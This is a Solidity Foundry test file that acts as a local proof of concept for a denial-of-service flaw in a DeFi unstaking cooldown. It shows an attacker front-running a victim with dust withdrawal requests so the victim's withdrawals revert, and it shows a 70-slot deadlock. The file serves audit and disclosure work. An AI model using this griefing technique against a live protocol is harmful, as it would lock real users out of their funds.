// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {AccessControlManager} from "../../contracts/governance/AccessControlManager.sol";
import {UnstakeCooldown} from "../../contracts/tranches/base/cooldown/UnstakeCooldown.sol";
import {CooldownBase} from "../../contracts/tranches/base/cooldown/CooldownBase.sol";
import {ICooldown} from "../../contracts/tranches/interfaces/cooldown/ICooldown.sol";
import {IUnstakeHandler} from "../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import {SaturnCooldownRequestImpl} from "../../contracts/tranches/strategies/saturn/SaturnCooldownRequestImpl.sol";
import {IsUSDat} from "../../contracts/tranches/strategies/saturn/IsUSDat.sol";
import {MockStakedUSDat} from "../../contracts/test/MockStakedUSDat.sol";

contract MockUSDat6 is ERC20 {
    constructor() ERC20("Mock USDat", "mUSDat") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Local-only PoC for the interaction between UnstakeCooldown's proxy-reuse
/// rules and SaturnCooldownRequestImpl's one-active-request guard.
contract SaturnUnstakeSameBlockReuseTest is Test {
    bytes32 internal constant COOLDOWN_WORKER_ROLE = keccak256("COOLDOWN_WORKER_ROLE");
    uint256 internal constant DUST_SHARES = 1e12; // ~= one 6-decimal USDat base unit at 1:1

    MockUSDat6 internal usdat;
    MockStakedUSDat internal sUSDat;
    AccessControlManager internal acm;
    UnstakeCooldown internal cooldown;
    SaturnCooldownRequestImpl internal saturnHandler;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        usdat = new MockUSDat6();
        sUSDat = new MockStakedUSDat(IERC20(address(usdat)), address(this));
        sUSDat.setFeeRecipient(address(0));

        acm = new AccessControlManager(address(this));

        UnstakeCooldown cooldownImpl = new UnstakeCooldown();
        cooldown = UnstakeCooldown(
            address(
                new ERC1967Proxy(
                    address(cooldownImpl),
                    abi.encodeWithSelector(
                        CooldownBase.initialize.selector,
                        address(this),
                        address(acm)
                    )
                )
            )
        );

        saturnHandler = new SaturnCooldownRequestImpl(IsUSDat(address(sUSDat)));

        address[] memory tokens = new address[](1);
        tokens[0] = address(sUSDat);
        IUnstakeHandler[] memory handlers = new IUnstakeHandler[](1);
        handlers[0] = IUnstakeHandler(address(saturnHandler));
        cooldown.setImplementations(tokens, handlers);

        // In production this role belongs to the strategy. The test contract stands in
        // for that authorized worker so we can isolate the cooldown/handler interaction.
        acm.grantRole(COOLDOWN_WORKER_ROLE, address(this));

        usdat.mint(address(this), 1_000e6);
        usdat.approve(address(sUSDat), type(uint256).max);
        sUSDat.deposit(1_000e6, address(this));
        IERC20(address(sUSDat)).approve(address(cooldown), type(uint256).max);

        assertEq(sUSDat.previewRedeem(DUST_SHARES), 1, "dust should equal one USDat base unit");
    }

    function testSameBlockSecondTransferToSameReceiverReverts() public {
        // First withdrawal request succeeds and leaves the Saturn proxy pending.
        // initialFrom is deliberately different from receiver to model an external
        // user selecting victim as the withdrawal receiver.
        cooldown.transfer(IERC20(address(sUSDat)), attacker, victim, DUST_SHARES);

        (uint64 unlockAt, IUnstakeHandler proxy) = cooldown.activeRequests(
            address(sUSDat),
            victim,
            0
        );
        assertGt(unlockAt, block.timestamp);
        assertEq(proxy.requestedAt(), block.timestamp);
        assertTrue(SaturnCooldownRequestImpl(address(proxy)).pending());

        // UnstakeCooldown sees requestedAt == block.timestamp and reuses the same proxy.
        // SaturnCooldownRequestImpl rejects that reuse because pending is already true.
        vm.expectRevert(abi.encodeWithSignature("Error(string)", "HasActiveRequest"));
        cooldown.transfer(IERC20(address(sUSDat)), victim, victim, DUST_SHARES);
    }

    function testNextTimestampUsesFreshProxyAndSucceeds() public {
        cooldown.transfer(IERC20(address(sUSDat)), attacker, victim, DUST_SHARES);
        (, IUnstakeHandler firstProxy) = cooldown.activeRequests(address(sUSDat), victim, 0);

        vm.warp(block.timestamp + 1);
        cooldown.transfer(IERC20(address(sUSDat)), victim, victim, DUST_SHARES);
        (, IUnstakeHandler secondProxy) = cooldown.activeRequests(address(sUSDat), victim, 1);

        assertTrue(address(firstProxy) != address(secondProxy));
        assertEq(secondProxy.requestedAt(), block.timestamp);
        assertTrue(SaturnCooldownRequestImpl(address(secondProxy)).pending());
    }

    function testAttackerCanFrontRunVictimForFortyConsecutiveBlocksWithDust() public {
        // Each unsolicited request costs only one base unit of USDat in this 1:1 mock.
        // By landing immediately before the victim in a block, the attacker makes the
        // victim reuse the newly-pending proxy, which deterministically reverts.
        for (uint256 i = 0; i < 40; i++) {
            cooldown.transfer(IERC20(address(sUSDat)), attacker, victim, DUST_SHARES);

            vm.expectRevert(abi.encodeWithSignature("Error(string)", "HasActiveRequest"));
            cooldown.transfer(IERC20(address(sUSDat)), victim, victim, DUST_SHARES);

            vm.warp(block.timestamp + 1);
        }

        ICooldown.TBalanceState memory state = cooldown.balanceOf(IERC20(address(sUSDat)), victim);
        assertEq(state.totalRequests, 40);

        // The public anti-spam cap eventually stops additional unsolicited requests.
        vm.expectRevert(ICooldown.ExternalReceiverRequestLimitReached.selector);
        cooldown.transfer(IERC20(address(sUSDat)), attacker, victim, DUST_SHARES);

        // A victim withdrawing to itself is not subject to the public cap and succeeds
        // once the attacker can no longer prepend another external request.
        cooldown.transfer(IERC20(address(sUSDat)), victim, victim, DUST_SHARES);
        state = cooldown.balanceOf(IERC20(address(sUSDat)), victim);
        assertEq(state.totalRequests, 41);
    }

    function testSeventyPendingSaturnRequestsDeadlockInsteadOfMerge() public {
        // CooldownBase documents that requests should merge into the last slot once the
        // 70-slot cap is reached. Saturn's handler cannot accept that merge while pending.
        for (uint256 i = 0; i < 70; i++) {
            cooldown.transfer(IERC20(address(sUSDat)), victim, victim, DUST_SHARES);
            vm.warp(block.timestamp + 1);
        }

        ICooldown.TBalanceState memory state = cooldown.balanceOf(IERC20(address(sUSDat)), victim);
        assertEq(state.totalRequests, 70);

        // This is not a same-block collision: the last request was made one second ago.
        (, IUnstakeHandler lastProxy) = cooldown.activeRequests(address(sUSDat), victim, 69);
        assertLt(lastProxy.requestedAt(), block.timestamp);
        assertTrue(SaturnCooldownRequestImpl(address(lastProxy)).pending());

        // UnstakeCooldown forces reuse at MAX_ACTIVE_REQUEST_SLOTS, but Saturn rejects
        // request() on a pending proxy, so the intended merge becomes a withdrawal deadlock
        // until an older request can be finalized and frees a slot.
        vm.expectRevert(abi.encodeWithSignature("Error(string)", "HasActiveRequest"));
        cooldown.transfer(IERC20(address(sUSDat)), victim, victim, DUST_SHARES);
    }
}
